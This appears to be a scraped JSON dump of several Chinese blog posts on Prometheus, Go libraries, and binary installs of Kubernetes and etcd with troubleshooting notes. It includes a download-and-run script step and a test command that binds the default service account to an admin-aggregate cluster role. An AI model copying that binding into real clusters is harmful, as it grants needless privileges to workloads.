providerName=kubernetescrd ingress=promserver namespace=kube-system\r查找原因kubernetes svc 匹配错误 service endpoint没有匹配到内容\n$ kubectl describe svc prometheus-server -n kube-system Name: prometheus-server\rNamespace: kube-system\rLabels: \u0026lt;none\u0026gt;\rAnnotations: Selector: monitor=prometheus\rType: ClusterIP\rIP: 10.110.116.203\rPort: \u0026lt;unset\u0026gt; 9090/TCP\rTargetPort: 9090/TCP\rEndpoints: \u0026lt;none\u0026gt;\rSession Affinity: None\rEvents: \u0026lt;none\u0026gt;\r修改后正常\n数学理论基础实现的\n配置文件\n- job_name: 'prometheus' 首先定义任务名称\rprometheus的客户端主要有两种方式采集\npull 主动输影的形式 push 被动推送的形式 put put指的是客户端（被监控机器）先安装各类已有exporters（由社区组积或企业开发的监控客户端插件）在系统上之后，exporter以守护进程的模式运行并开始采集数据\nexporter 本身也是一个htp_server 可以对http请求作出响应返回数据（KV metrics）\nprometheua用pull 这种主动拉的方式（HTTP get）去访问每个节点上exporter并采样回需要的数据\npush： push指的是在客户端（或者服务端）安装这个官方提供的pushgateway插件然后，使用我们自行开发的各种脚本把监控数据组织成K/V的形式，metrics形式发送给pushgateway之后 puahgataway会再推送给prometheus\n这种是一种被动的数据采集模式\n","permalink":"https://www.oomkill.com/2019/04/prometheus-install/","summary":"","title":"prometheus传统架构安装"},{"content":"Cobra功能 简单子命令cli 如 kubectl verion kubectl get\n自动识别-h，\u0026ndash;help 帮助\n更过参考官方手册：https://github.com/spf13/cobra\nkubectl get pod --all-namespaces\nget 代表命令（command） pod 代表事务（args） --all-namespaces 代表标识（flag） command 代表动作， Args 代表事务， flags 代表动作的修饰符。 使用Cobra 使用cobra需要main.go或和cmd/cmd.go(非固定，根据官方手册说明操作的)，来创建需要添加的命令。\ncobra不需要构造函数，只需要创建命令即可\nrootCmd = \u0026amp;cobra.Command{ Use: \u0026quot;db \u0026quot;, Short: \u0026quot;test1\u0026quot;, Long: `this is a test123`, Run: func(cmd *cobra.Command, args []string) { log.Println(cfgFile, port) }, } func Execute() { if err := rootCmd.Execute(); err != nil { log.Fatal(err) os.Exit(1) } } 还需要在init()方法中定义flag和handle等配置。\nfunc init() { rootCmd.PersistentFlags().StringVar(\u0026amp;cfgFile, \u0026quot;c\u0026quot;, \u0026quot;\u0026quot;, \u0026quot;config file (default /etc/php.ini)\u0026quot;) rootCmd.PersistentFlags().IntVar(\u0026amp;port, \u0026quot;p\u0026quot;, 3306, \u0026quot;config file (default /etc/php.ini)\u0026quot;) } 创建main.go，在其初始化cobra\npackage main import \u0026quot;your_app/cmd\u0026quot; func main() { cmd.Execute() } 使用flag 标志是args来控制动作command的操作方式的。\n**Persistent Flags：**全局性flag 可用于它所分配的命令以及该命令下的每个命令。在根上分配标志作为全局flag。\nLocal Flags：局部性flag 在本args分配一个标志，该标志仅适用于该特定命令。\nRequired flags：必选flag，flag默认是可选的。如果希望命令在未设置flag时报告错误，请将其标记为required\nrootCmd.Flags().StringVarP(\u0026amp;cfgFile, \u0026quot;config\u0026quot;, \u0026quot;c\u0026quot;, \u0026quot;\u0026quot;, \u0026quot;config file (require)\u0026quot;) rootCmd.MarkFlagRequired(\u0026quot;config\u0026quot;) 使用子命令\ntestCmd = \u0026amp;cobra.Command{ Use: \u0026quot;zhangsan\u0026quot;, Short: \u0026quot;child command\u0026quot;, Long: `this is a child command`, Run: func(cmd *cobra.Command, args []string) { fmt.Println(\u0026quot;root \u0026gt; zhangsan\u0026quot;) }, } rootCmd.AddCommand(testCmd) ","permalink":"https://www.oomkill.com/2019/03/go-cobra/","summary":"","title":"Go每日一库 - cobra"},{"content":"包获取：go get -u github.com/gorhill/cronexpr\n创建一个定时任务\nexpr, err = cron.Parse(\u0026quot;* * * * *\u0026quot;); 获得任务的下次执行时间\nnextTime = expr.Next(now) 完整代码\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;time\u0026quot; cron \u0026quot;github.com/gorhill/cronexpr\u0026quot; ) type CronJob struct { expr *cron.Expression nextTime time.Time //expr.now } func main() { var ( cronJob *CronJob expr *cron.Expression now time.Time scheduleTable map[string]*CronJob // key 任务的名称 ) scheduleTable = make(map[string]*CronJob) now = time.Now() expr = cron.MustParse(\u0026quot;*/5 * * * * * *\u0026quot;) cronJob = \u0026amp;CronJob{ expr: expr, nextTime: expr.Next(now), } scheduleTable[\u0026quot;job1\u0026quot;] = cronJob expr = cron.MustParse(\u0026quot;*/10 * * * * * *\u0026quot;) cronJob = \u0026amp;CronJob{ expr: expr, nextTime: expr.Next(now), } // 将任务注册到调度表中 scheduleTable[\u0026quot;job2\u0026quot;] = cronJob // 调度协程 go func() { var( _now time.Time cname string cronjob *CronJob ) for { _now = time.Now() for cname, cronjob = range scheduleTable { if cronjob.nextTime.Before(_now) || cronjob.nextTime.Equal(_now) { go func(name string) { fmt.Println(\u0026quot;exec\u0026quot;, name) }(cname) cronjob.nextTime = cronjob.expr.Next(_now) fmt.Println(\u0026quot;next exec time: \u0026quot;,cronjob.nextTime) } } select { case \u0026lt;-time.NewTimer(100 * time.Millisecond).C: //睡眠 } } }() time.Sleep(time.Minute*3) } ","permalink":"https://www.oomkill.com/2019/02/cronexpr/","summary":"","title":"Go每日一库 - cronexpr"},{"content":"Kubernetes集群的构成 Master Node (Control plane) Master 是整个 Kubernetes 集群构成的基础，它负责整个集群的管理，例如处理集群的状态；组件包含 API Server, Controller manager, Scheduller, Etcd\nAPI server API 服务器是 Master 的统一前端入口，负责集群内其他组件的 协调 与 通信。该组件用于定义集群的状态。可以通过命令行, HTTP API, 第三方托管平台（dashboard, Rancker, Kuboard等）与 Kubernetes API 进行交互。\nScheduler 调度程序 Scheduler 负责根据可用资源来决定如何去部署容器，部署到哪里？确保所有 Pod（容器组）都分配给某一组节点。\nController Manager Controller manager，又分为Controller 和 Manager，Controller的组要作用是用于协调各种控制器(Deployment, Daemonset\u0026hellip;)，这些控制器可确保在节点发生故障时采取适当的措施。而 Manager 则管理的众多Controller；更一般地说，CM 负责随时将集群的当前状态调整到所需状态（Kubernetes设计基石）。\netcd etcd 是控制平面内的一个组件，他提供了 Kubernetes 资源的存储，并为集群内组件提供了 Watch 的功能，这将意味着，etcd 在 kubernetes 集群中作为存储与分布式协调的功能。\nWorker nodes 每个集群中至少需要存在一个工作节点，但是通常会有大量的节点；而工作节点包括的组件不限于 Kubelet, Kube-proxy, CNI Plugin。\nKubelet kubelet是工作节点中管理运行时的组件，负责整个Pod （容器组）进程的生命周期\nKube-proxy Kube-proxy 为整个集群内提供了 service 的功能，如果这个组件无法正常工作，那么整个集群内的网络通信将不能正常，因为 service 是作为集群内服务的访问入口，包含 Kubernetes API service。\nCNI CNI (Container Network Interface) 是 Kubernetes 集群中提供跨节点通信的一个组件，通常来说，它是一个独立于容器运行时（Docker等）的网络插件规范，旨在实现容器之间和容器与宿主机之间的网络连接。\n一个 CNI 基本的功能就是去管理网络设备的生命周期，例如，生成网卡，添加IP地址，注销网卡，而构成这些网络功能的则有操作系统来提供的，例如网络隧道(VxLAN)，而还存在一种情况就是三层网络，这时CNI会作为一个路由器来分发路由。除此之外，CNI还提供了更多的功能，例如数据包加密，网络策略，服务网格，网络加速，IPAM等功能\n通过二进制安装Kubernetes cluster 硬件配置推荐 在选择节点数量时，需要考虑集群的用途，通常情况下建议至少使用 3 个节点 (APIServer)，对于控制平面其他组件来说，通常最少为两个即可，因为HA架构中工作节点总是需要一个即可\n要运行 apiserver 和 etcd，您需要一台具有 2 个内核和 2GB RAM 的 机器，用于中小型集群，更大规模集群可能需要更多的核心。工作节点必须有足够的资源来托管您的应用程序，并且可以有不同的配置。\netcd 硬件配置推荐 Kuberentes 中工作节点需要启动一个或多个 etcd 实例，通常官方推荐运行奇数个 etcd 实例，因为一个 3 实例时有两个活跃就具备了集群的 quorum ，同理五个实例时存在3个实例活跃即可，7=\u0026gt;4 等，通常集群规模不大于9，否则存在同步时的延迟。\n集群的部署模式 单独托管的 etcd 集群 master节点同台主机上托管 etcd 集群 通过 kubeadm 生成的 etcd 集群 在这里我们使用二进制方式最小化部署，即 单节点的 etcd 集群，与同时为 control plane 与 worker 一体托管在单台物理/虚拟机之上的 Kubernetes 集群\n题外话：kubeadm 和 二进制究竟有什么区别？\n实际上 kubeadm 和 二进制本质上并没有什么区别，如果非要说存在区别的话，那么就是其 Procss Manager 不同，\n一个是由 systemd/system v 或其他操作系统维护的1 id的进程进行维护； kubeadm 部署的 kubelet 将 由 kubelet 进程自己来监控，当 pod 崩溃时重启该 pod，kubelete 也无法对他们进行健康检查。静态 pod 始终绑定在某一个 kubelet，并且始终运行在同一个节点上，可以通过在 master 节点上查看 /etc/kubernetes/manifests 目录 配置证书 通常情况下，大家都知道安装 kubernetes 集群需要证书，但是不知道为什么需要证书，这里需要了解 Kubernetes 认证机制，也就是“用户”在kubernetes集群中被称为什么\nKubernetes 中用户被分为几类：\nX.509 证书 静态 Token 文件 Bootstrap Tokens Service Account Tokens kubernetes 使用了客户端证书方式进行认证，这是作为外部用户的一种方式，这些证书会被默认生成对应的内部用户，所以需要准备证书文件，在本文中一切准备文件都是由脚本生成，不做基础的配置讲解。\n对于 X.509 证书，需要注意有几点\nkubernetes 中，对于证书的用户，CN就是用户名，O 就是组织。 对于证书认证来说，客户端证书，也就是说客户端必须在可信任列表中，也就是 subject_name 中允许的 对于 Kubernetes 组件来说，通常情况下需要包含 Kubernetes API service 的所有名称（短域名+完整域名） kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster kubernetes.default.svc.cluster.local 如果你希望使用IP，而不是域名，也可以对证书中sub_name增加对应域名\n对于组件间认证，目前 Kubernetes 中基本上组件间认证都有 kubeconfig 完成，而 kubelet，kube-controller-manager 这两个组件，由于提供的功能不同，可能存在其他的认证方式；例如 kubelet 所作的事情是 “监听Pod资源进行部署” 那么这个时候与 APIServer 通讯使用了 kubeconfig，在例如 kubelet 要被 APIServer 签发时，此时认证是使用的 bootstrap token 进行的，而这个kubeconfig 就是 签发后生成的内容，本质上来说，kubelet 没有客户端证书，只有token，而例如 kube-scheduler 是有客户端证书，但是需要生产 kubeconfig 文件\n签发kubelet 给 kubelet 签发证书主要由两部分组成，一种是 kube-controller-manager 自动签发，一种是 kubectl certifcate approve 手动签发，这里就有必要知道 kubelet 的认证的流程：\nkubelet启动时会找 kubeconfig ，如果没有进入下一部 没有 kubeconfig，会使用 bootstraps 进行认证，此时会被颁发客户端证书 在通过后，kubelet 会根据签发证书 生成 \u0026ndash;kubeconfig 指定的 kubeconfig 文件 下次后，kubelet 会根据这个 kubeconfig 同 Kubernetes API 进行 验证 了解了 kubelet 的签发过程，就明白在二进制部署时，为什么需要做一个 clusterrolebinding ？\n因为Kubernetes API 为 kubelet 的 bootstraps-token 使用的是用户 system:node-bootstrapper ，所以要想让这个用户可以访问 API 资源，那么就需要为这个用户绑定上集群角色（用户/组），这就需要执行一个命令\n$ kubectl create clusterrolebinding kubelet-bootstrap --clusterrole=system:node-bootstrapper --group=system:bootstrappers\r此时再去查看证书颁发，这时因为有权限访问 API 资源了， 所以获得了证书的被签发\n$ kubectl get csr\rNAME AGE REQUESTOR CONDITION\rnode-csr-a-MREQ1IybB0U5M8RP5FasSjckQOZiCoCYlf8ipDwx8 5m11s system:bootstrapper Pending\rkube-dns 的部署 coredns部署\n$ mkdir coredns \u0026amp;\u0026amp; cd coredns\r$ wget https://raw.githubusercontent.com/coredns/deployment/master/kubernetes/coredns.yaml.sed\r$ wget https://raw.githubusercontent.com/coredns/deployment/master/kubernetes/deploy.sh\r$ bash deploy.sh -i 10.96.0.10 -r \u0026quot;10.96.0.0/12\u0026quot; -s -t coredns.yaml.sed |kubectl apply -f - 开启IPVS 内核开启IPVS功能否则降级\ncat \u0026gt; /etc/sysconfig/modules/ipvs.modules \u0026lt;\u0026lt; EOF\r#!/bin/bash\ripvs_mods_dir=\u0026quot;/usr/lib/modules/$(uname -r)/kernel/net/netfilter/ipvs\u0026quot;\rfor i in \\$(ls \\$ipvs_mods_dir | grep -o \u0026quot;^[^.]*\u0026quot;); do\r/sbin/modinfo -F filename \\$i \u0026gt;/dev/null if [ \\$? -eq 0 ]; then\r/sbin/modprobe -- \\$i fi done\rEOF\ror\ncat \u0026gt; /etc/sysconfig/modules/ipvs.modules \u0026lt;\u0026lt;EOF\r#!/bin/bash\ripvs_modules=\u0026quot;ip_vs ip_vs_lc ip_vs_wlc ip_vs_rr ip_vs_wrr ip_vs_lblc ip_vs_lblcr ip_vs_dh ip_vs_sh ip_vs_fo ip_vs_nq ip_vs_sed ip_vs_ftp nf_conntrack_ipv4\u0026quot;\rfor kernel_module in \\${ipvs_modules}; do\r/sbin/modinfo -F filename \\${kernel_module} \u0026gt; /dev/null 2\u0026gt;\u0026amp;1\rif [ $? -eq 0 ]; then\r/sbin/modprobe \\${kernel_module}\rfi\rdone\rEOF\rchmod 755 /etc/sysconfig/modules/ipvs.modules \u0026amp;\u0026amp; bash /etc/sysconfig/modules/ipvs.modules \u0026amp;\u0026amp; lsmod | grep ip_vs\rTroubleshooting apiserver报错 没有kubeappserver用户 Failed at step USER spawning No such process\rMar 2 04:54:56 node02 systemd: controller-manager.service: main process exited, code=exited, status=1/FAILURE\rMar 2 04:54:56 node02 kube-controller-manager: Get http://127.0.0.1:8443/api/v1/namespaces/kube-system/configmaps/extension-apiserver-authentication: net/http: HTTP/1.x transport connection broken: malformed HTTP response \u0026quot;\\x15\\x03\\x01\\x00\\x02\\x02\u0026quot;\rMar 2 04:54:56 node02 systemd: Unit controller-manager.service entered failed state.\rUnable to connect to the server: net/http: HTTP/1.x transport connection broken: malformed HTTP resp - kevin_loving的博客 - CSDN博客\n可能是启动单元文件有问题，手动启动后正常\nMar 2 09:44:51 node02 kube-controller-manager: W0302 09:44:51.672404 39926 client_config.go:554] error creating inClusterConfig, falling back to default config: unable to load in-cluster configuration, KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT must be defined\rnode \u0026ldquo;xxxx\u0026rdquo; not found 如下面问题，可能原因为 kubelet 正式还未签发\nNov 14 16:31:03 master01 kubelet: E1114 16:31:03.677280 8587 kubelet.go:2270] node \u0026quot;master01\u0026quot; not found\r380 19810 kubelet.go:2292] node \u0026quot;master-machine\u0026quot; not found\rMay 12 23:45:11 master-machine kubelet: E0512 23:45:11.415099 19810 kubelet.go:2292] node \u0026quot;master-machine\u0026quot; not found\rMay 12 23:45:11 master-machine kubelet: E0512 23:45:11.460097 19810 certificate_manager.go:434] Failed while requesting a signed certificate from the master: cannot create certificate signing request: certificatesigningrequests.certificates.k8s.io is forbidden: User \u0026quot;system:anonymous\u0026quot; cannot create resource \u0026quot;certificatesigningrequests\u0026quot; in API group \u0026quot;certificates.k8s.io\u0026quot; at the cluster scope\rUser \u0026ldquo;system:anonymous\u0026rdquo; cannot list resource xxx 原因为：kubelet 正式还未签发\nk8s.io/client-go/informers/factory.go:135: Failed to list *v1.CSIDriver: csidrivers.storage.k8s.io is forbidden: User \u0026quot;system:anonymous\u0026quot; cannot list resource \u0026quot;csidrivers\u0026quot; in API group \u0026quot;storage.k8s.io\u0026quot; at the cluster scope\r问题：\u0026quot;master01\u0026quot; is forbidden: User \u0026quot;system:anonymous\u0026quot; 原因：用户未授权\n需要注意的是，这里使用的是 bootstrap 证书进行授权，所以绑定的用户必须为 bootstrap 证书授权的用户或组。\n$ kubectl create clusterrolebinding kubelet-bootstrap --clusterrole=system:node-bootstrapper --group=system:bootstrappers\rThe kube-apiserver has several requirements to enable TLS bootstrapping: Authenticating the bootstrapping kubelet to the system:bootstrappers group [2]\nroot@debian-template:~# kubectl get clusterrole system:node-bootstrapper -oyaml\rapiVersion: rbac.authorization.k8s.io/v1\rkind: ClusterRole\rmetadata:\rannotations:\rrbac.authorization.kubernetes.io/autoupdate: \u0026quot;true\u0026quot;\rcreationTimestamp: \u0026quot;2024-11-23T04:26:57Z\u0026quot;\rlabels:\rkubernetes.io/bootstrapping: rbac-defaults\rname: system:node-bootstrapper\rresourceVersion: \u0026quot;54\u0026quot;\rselfLink: /apis/rbac.authorization.k8s.io/v1/clusterroles/system%3Anode-bootstrapper\ruid: 6f39c3aa-e46d-413f-8834-35c8832c328a\rrules:\r- apiGroups:\r- certificates.k8s.io\rresources:\r- certificatesigningrequests\rverbs:\r- create\r- get\r- list\r- watch\r报错如下\nmaster01 kubelet: E1114 17:16:33.581116 8559 kubelet.go:2270] node \u0026quot;master01\u0026quot; not found\rfailed to ensure node lease exists, will retry in 6.4s, error: leases.coordination.k8s.io \u0026quot;master01\u0026quot; is forbidden: User \u0026quot;system:anonymous\u0026quot; cannot get resource \u0026quot;leases\u0026quot; in API group \u0026quot;coordination.k8s.io\u0026quot; in the namespace \u0026quot;kube-node-lease\u0026quot;\r容器内 dial tcp 10.96.0.1:443: connect: connection timed out 问题1： flannela访问 dial tcp 10.96.0.1:443: connect: connection timed out\n问题2：open /run/flannel/subnet.env: no such file or directory\n问题3： Container runtime network not ready: NetworkReady=false reason:NetworkPluginNotReady message:docker: network plugin is not ready: cni config uninitialized\n解决：检查kube-proxy组件\nNov 14 17:30:04 master01 kubelet: E1114 17:30:04.097261 1160 kubelet.go:2190] Container runtime network not ready: NetworkReady=false reason:NetworkPluginNotReady message:docker: network plugin is not ready: cni config uninitialized\r$ kubectl logs kube-flannel-ds-dvsv7 -n kube-system\r....\rE1114 23:22:20.984238 1 main.go:243] Failed to create SubnetManager: error retrieving pod spec for 'kube-system/kube-flannel-ds-dvsv7': Get \u0026quot;https://10.96.0.1:443/api/v1/namespaces/kube-system/pods/kube-flannel-ds-dvsv7\u0026quot;: dial tcp 10.96.0.1:443: connect: connection timed out\r$ kubectl get csr 显示No Resources Found的解决记录 问题：kubectl get csr 显示No Resources Found的解决记录\n解决：需要先将 bootstrap token 文件中的 kubelet-bootstrap 用户赋予 system:node-bootstrapper 角色，然后 kubelet 才有权限创建认证请求\n授予KUBE-APISERVER对KUBELET API的访问权限 kubelet启动启动时，--kubeletconfig 使用参数对应的文件是否存在 如果不存在--bootstrap-kubeconfig指定的kubeconfig文件向kube-apiserver发送CSR请求\nkube-apiserver 收到 CSR 请求后，对其中的 token 进行认证，认证通过后将请求的用户设置为system:bootstrap:\u0026lt;Token ID\u0026gt;，组设置为 ，system:bootstrappers此操作称为Bootstrap Token Auth。\n默认这个用户和组没有创建CSR的权限，kubelet没有启动，错误日志如下：\nUnable to register node \u0026quot;master-machine\u0026quot; with API server: nodes is forbidden: User \u0026quot;system:anonymous\u0026quot; cannot create resource \u0026quot;nodes\u0026quot; in API group \u0026quot;\u0026quot; at the cluster scope\r解决方法是：创建一个集群角色绑定，绑定一个组：system:bootstrapper 和一个clusterrole system:node-bootstrapper\n$ kubectl create clusterrolebinding kubelet-bootstrap --clusterrole=system:node-bootstrapper --group=system:bootstrappers\r测试授权\nkubectl create clusterrolebinding kubelet-bootstrap --clusterrole=system:node-bootstrapper --group=system:bootstrappers\rsystem:serviceaccount:default:default\rkubectl create clusterrolebinding firewalld-default --clusterrole=system:aggregate-to-admin --user=system:serviceaccount:default:default\rsystem:aggregate-to-admin\rkube flannel cant get cidr although podcidr available on node E0729 06:56:09.253632 1 main.go:330] Error registering network: failed to acquire lease: node \u0026quot;master-machine\u0026quot; pod cidr not assigned\rI0729 06:56:09.253682 1 main.go:447] Stopping shutdownHandler...\rW0729 06:56:09.253809 1 reflector.go:436] github.com/flannel-io/flannel/subnet/kube/kube.go:403: watch of *v1.Node ended with: an error on the server (\u0026quot;unable to decode an event from the watch stream: context canceled\u0026quot;) has prevented the request from succeeding\r参考：kube flannel cant get cidr although podcidr available on node 原因为 CIDR无法分配\nnetwork plugin is not ready: cni config uninitialized Container runtime network not ready: NetworkReady=false reason:NetworkPluginNotReady message:docker: network plugin is not ready: cni config uninitialized 没有安装网络插件，安装任意网络插件后恢复。\nmvcc: required revision has been compacted kube-apiserver: W1120 17:18:20.199950 70454 watcher.go:207] watch chan error: etcdserver: mvcc: required revision has been compacted\r这里是etcd返回的错误，被apiserver视为警告，在注释中有这么一句话\nIf the context is \u0026ldquo;context.Background/TODO\u0026rdquo;, returned \u0026ldquo;WatchChan\u0026rdquo; will not be closed and block until event is triggered, except when server returns a non-recoverable error (e.g. ErrCompacted).\n如果这个上下文返回WatchChan将在下次事件被触发前不会被关闭或阻塞，除非服务器返回一个ErrCompacted （不可恢复）\n对于etcd 对 Revision 有如下说明\netcd对每个kv的revision 都会保留一个压缩周期的值，例如每5分钟收集一次最新revision，当压缩周期达到时，将从历史记录中后去最后一个修订版本，例如为100，此时会压缩，压缩成功会重置计数器，并以最新的revision和新的历史记录进行开始，压缩失败将在5分钟后重试--auto-compaction-retention=10 是配置压缩周期的 每多少个小时键值存储运行定期压缩。\n如果最新的revision已被修订，etcd返回一个 ErrCompacted 表示已修订，此时表示为不可恢复状态\n返回错误时表示这个watch被关闭，为了优雅的关闭chan，kubernetes会对这个watch错误进行返回，而 ErrCompacted 本质上不算错误\nwch := wc.watcher.client.Watch(wc.ctx, wc.key, opts...)\rfor wres := range wch {\rif wres.Err() != nil {\rerr := wres.Err()\r// If there is an error on server (e.g. compaction), the channel will return it before closed.\rlogWatchChannelErr(err)\rwc.sendError(err)\rreturn\r}\r...\rReference [1] Maintenance\n[2] kubelet-tls-bootstrapping\n","permalink":"https://www.oomkill.com/2019/01/kubernetes-install-with-binary-files/","summary":"","title":"使用二进制文件构建k8s集群"},{"content":"先看代码\npackage main import ( \u0026quot;fmt\u0026quot; ) func main() { var a = \u0026quot;hello world\u0026quot; var b = \u0026quot;中\u0026quot; fmt.Println([]rune(a)) fmt.Println([]rune(b)) fmt.Println([]byte(b)) } go源码中的定义\n// byte is an alias for uint8 and is equivalent to uint8 in all ways. It is // used, by convention, to distinguish byte values from 8-bit unsigned // integer values. type byte = uint8 // rune is an alias for int32 and is equivalent to int32 in all ways. It is // used, by convention, to distinguish character values from integer values. type rune = int32 byte是uint8、rune为uint32，一个仅限于ascii码的值，一个支持更多的值。rune比byte能表达更多的数。\ngolang默认使用utf8编码，一个中文占用3字节，一个utf8数字占用1字节，utf8字母占用1字节\n","permalink":"https://www.oomkill.com/2018/12/golang-byte-and-rune/","summary":"","title":"Go byte与rune区别"},{"content":"bufio包实现了有缓冲的I/O。它包装一个io.Reader或io.Writer接口对象，os.stdin就是实现了这个接口\npackage main import ( \u0026quot;bufio\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;os\u0026quot; ) var buff *bufio.Reader func main() { buff = bufio.NewReader(os.Stdin) str, err := buff.ReadString('\\n') if err == nil { fmt.Printf(\u0026quot;input was :%s\u0026quot;, str) } } ReadString(byte) 遇到byte后返回，包含已读到的和byte，如果在读到之前遇到错误，返回读取的信息及该错误\n在写文件时。可以写入缓冲区来可以提升磁盘性能\n","permalink":"https://www.oomkill.com/2018/11/go-bufio/","summary":"","title":"Go每日一库 - bufio缓冲区的终端输入"},{"content":"概述 etcd 是兼具一致性和高可用性的键值数据库，为云原生架构中重要的基础组件，由CNCF 孵化托管。etcd 在微服务和 Kubernates 集群中不仅可以作为服务注册与发现，还可以作为 key-value 存储的中间件。\n先决条件 运行的 etcd 集群个数成员为奇数。 etcd 是一个 leader-based 分布式系统。确保主节点定期向所有从节点发送心跳，以保持集群稳定。 保持稳定的 etcd 集群对 Kubernetes 集群的稳定性至关重要。因此，请在专用机器或隔离环境上运行 etcd 集群，以满足所需资源需求]。 确保不发生资源不足。\n集群的性能和稳定性对网络和磁盘 IO 非常敏感。任何资源匮乏都会导致心跳超时，从而导致集群的不稳定。不稳定的情况表明没有选出任何主节点。在这种情况下，集群不能对其当前状态进行任何更改，这意味着不能调度新的 pod。 相关术语 Raft：etcd所采用的保证分布式系统强一致性的算法。 Node：节点 ，Raft状态机的一个实例，具有唯一标识。 Member： 成员，一个etcd实例。承载一个Node，且可为客户端请求提供服务。 Cluster：集群，由多个Member构成可以协同工作的etcd集群。 Peer：同伴，Cluster中其他成员。 Proposal ：提议，一个需要完成 raft 协议的请求(例如写请求，配置修改请求)。 Client： 向etcd集群发送HTTP请求的客户端。 WAL：预写式日志，etcd用于持久化存储的日志格式。 snapshot：etcd防止WAL文件过多而设置的快照，存储etcd数据状态。 Proxy：etcd的一种模式，为etcd集群提供反向代理服务。 Leader：Raft算法中通过竞选而产生的处理所有数据提交的节点。 Follower：竞选失败的节点作为Raft中的从属节点，为算法提供强一致性保证。 Candidate：当Follower超过一定时间接收不到Leader的心跳时转变为Candidate开始竞选。 Term：某个节点成为Leader到下一次竞选时间，称为Ubuntu一个Term。 Index：数据项编号。Raft中通过Term和Index来定位数据。 ETCD 部署 源码安装 基于master分支构建etcd\ngit clone https://github.com/etcd-io/etcd.git\rcd etcd\r./build # 如脚本格式为dos的，需要将其格式修改为unix，否则报错。\r启动命令\n--listen-client-urls 于 --listen-peer-urls 不能为域名\n--listen-client-urls 于 --advertise-client-urls\n./etcd --name=etcd \\\r--data-dir=/var/lib/etcd/ \\\r--listen-client-urls=https://10.0.0.1:2379 \\\r--listen-peer-urls=https://10.0.0.1:2380 \\\r--advertise-client-urls=https://hketcd:2379 \\\r--initial-advertise-peer-urls=https://hketcd:2380 \\\r--cert-file=\u0026quot;/etc/etcd/pki/server.crt\u0026quot; \\\r--key-file=\u0026quot;/etc/etcd/pki/server.key\u0026quot; \\\r--client-cert-auth=true \\\r--trusted-ca-file=\u0026quot;/etc/etcd/pki/ca.crt\u0026quot; \\\r--auto-tls=false \\\r--peer-cert-file=\u0026quot;/etc/etcd/pki/peer.crt\u0026quot; \\\r--peer-key-file=\u0026quot;/etc/etcd/pki/peer.key\u0026quot; \\\r--peer-client-cert-auth=true \\\r--peer-trusted-ca-file=\u0026quot;/etc/etcd/pki/ca.crt\u0026quot; \\\r--peer-auto-tls=false\r其他方式 CentOS 可以使用 yum install etcd -y Ubuntu 可以预构建的二进制文件 安装报错 certificate: x509: certificate specifies an incompatible key usage\n原因：此处证书用于serverAuth 与clientAuth，缺少clientAuth导致\n解决：extendedKeyUsage=serverAuth， clientAuth\nWARNING: 2020/11/12 14:11:42 grpc: addrConn.createTransport failed to connect to {0.0.0.0:2379 \u0026lt;nil\u0026gt; 0 \u0026lt;nil\u0026gt;}. Err: connection error: desc = \u0026quot;transport: authentication handshake failed: remote error: tls: bad certificate\u0026quot;. Reconnecting...\r{\u0026quot;level\u0026quot;:\u0026quot;warn\u0026quot;,\u0026quot;ts\u0026quot;:\u0026quot;2020-11-12T14:11:46.415+0800\u0026quot;,\u0026quot;caller\u0026quot;:\u0026quot;embed/config_logging.go:198\u0026quot;,\u0026quot;msg\u0026quot;:\u0026quot;rejected connection\u0026quot;,\u0026quot;remote-addr\u0026quot;:\u0026quot;127.0.0.1:52597\u0026quot;,\u0026quot;server-name\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;error\u0026quot;:\u0026quot;tls: failed to verify client certificate: x509: certificate specifies an incompatible key usage\u0026quot;}\r原因：证书使用的者不对。\n解决：查看subjectAltName 是否与请求地址一致。\nerror \u0026quot;tls: failed to verify client's certificate: x509: certificate specifies an incompatible key usage\u0026quot;, ServerName \u0026quot;\u0026quot;\r原因：ETCD_LISTEN_PEER_URLS 与 ETCD_LISTEN_CLIENT_URLS 不能用域名\nerror verifying flags, expected IP in URL for binding (https://hketcd:2380). See 'etcd --help'\rerror #0: x509: certificate has expired or is not yet valid\n原因：证书还未生效\n解决：因服务器时间不对导致，校对时间后正常\netcd: rejected connection from \u0026quot;x.x.x.x:1126\u0026quot; (error \u0026quot;tls: failed to verify client's certificate: x509: certificate signed by unknown authority (possibly because of \\\u0026quot;crypto/rsa: verification error\\\u0026quot; while trying to verify candidate authority certificate \\\u0026quot;etcd-ca\\\u0026quot;)\u0026quot;, ServerName \u0026quot;\u0026quot;)\r配置文件详解 config\netcdctl 使用 etcdctl --key-file=/etc/etcd/pki/client.key \\\r--cert-file=/etc/etcd/pki/client.crt \\\r--ca-file=/etc/etcd/pki/ca.crt \\\r--endpoint=\u0026quot;https://node01.k8s.test:2379\u0026quot; \\\rcluster-health\rmember 288506ee270a7733 is healthy: got healthy result from https://node03.k8s.test:2379\rmember 863156df9b1575d1 is healthy: got healthy result from https://node02.k8s.test:2379\rmember ff386de9dc0b3c40 is healthy: got healthy result from https://node01.k8s.test:2379\rv3 版本客户端使用\nexport ETCDCTL_API=3\retcdctl --key=/etc/etcd/pki/client.key \\\r--cert=/etc/etcd/pki/client.crt \\\r--cacert=/etc/etcd/pki/ca.crt \\\r--endpoints=\u0026quot;https://master.k8s:2379\u0026quot; \\\rendpoint health\retcdctl \\\r--key=/etc/etcd/pki/client.key \\\r--cert=/etc/etcd/pki/client.crt \\\r--cacert=/etc/etcd/pki/ca.crt \\\r--endpoints=\u0026quot;https://master.k8stx.com:2379\u0026quot; \\\rendpoint status\r日志独立 etcd日志默认输出到 /var/log/message 如果想独立日志为一个文件，可以使用rsyslogd过滤器功能，使etcd的日志输出到单独的文件内。\n新建/etc/rsyslog.d/xx.conf文件。 在新建文件内写入内容如下 if $programname == 'etcd' then /var/log/etcd.log\r# 停止往其他文件内写入，如果不加此句，会继续往/var/log/message写入。\rif $programname == 'etcd' then stop 也可以\nif ($programname == 'etcd') then {\raction(type=\u0026quot;omfile\u0026quot; file=\u0026quot;/var/log/etcd.log\u0026quot;)\rstop\r}\r","permalink":"https://www.oomkill.com/2018/11/etcd-install-bin/","summary":"","title":"etcd二进制安装与配置"},{"content":"1 elasticsearch介绍 